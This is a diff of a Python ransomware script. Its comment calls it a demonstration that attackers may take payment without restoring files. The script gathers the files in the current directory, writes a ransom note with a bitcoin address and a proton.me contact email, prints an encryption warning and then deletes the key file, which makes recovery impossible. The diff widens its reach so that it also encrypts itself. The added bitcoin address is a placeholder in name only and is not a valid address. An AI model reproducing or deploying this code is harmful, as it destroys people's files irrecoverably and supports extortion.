@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
-#This is a ransomware without the decryption key and it is to demonstrate some hackers will collect payment without any intention of releasing the locked file.
+#This is a ransomware without the password/decryption_code and it is to demonstrate some hackers will collect payment without any intention of releasing the locked file.
 import os
 from cryptography.fernet import Fernet
 
 dir_files = []
 for file in os.listdir():
-        if file == "ransomware.py" or file == "payment_instructions":
+        if file == "payment_instructions":
                 continue
         if os.path.isfile(file):
                 dir_files.append(file)
@@ -14,7 +14,7 @@ print (dir_files)
 
 payment = open("payment_instructions", "w")
 
-payment.write('''Send the bitcoin payment to this address: 14qViLJfdGaP4EeHnDyJbEGQysnCpwk3gd.
+payment.write('''Send the bitcoin payment to this address: 15kRaTOsdAnTENeRoAtReUSodinVirgil12
  
 Then send an email to recovermyfiles@proton.me. With Email Subject +++ victim 0101 Paid +++.
  
@@ -40,7 +40,7 @@ print ('''
 ATTENTION!!!.. All your files has been encrypted by our Ransomware. You are victim 0101. Read the payment_instructions file for more details....ATTENTION!!!
 
 ''')
-filepath = "/home/parrot/Esu/Malware/lock.key" #Replace with actual file and directory where the ransomware program resides
+filepath = "/home/parrot/Esu/lock.key" #Replace with actual directory where the ransomware program is being run or inverse the frontslash for windows(\)
 
 try:
 	os.remove(filepath)
